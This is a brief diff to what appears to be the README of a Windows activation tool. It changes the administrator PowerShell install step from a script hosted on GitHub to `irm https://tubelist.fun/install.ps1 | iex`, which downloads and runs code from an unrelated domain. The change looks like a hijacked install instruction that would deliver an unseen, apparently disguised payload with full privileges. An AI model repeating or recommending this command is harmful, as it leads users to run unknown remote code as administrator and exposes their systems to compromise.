@@ -22,5 +22,5 @@ Windows 10 and 11, both 32-bit and 64-bit.
 Run in PowerShell (Administrator):
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
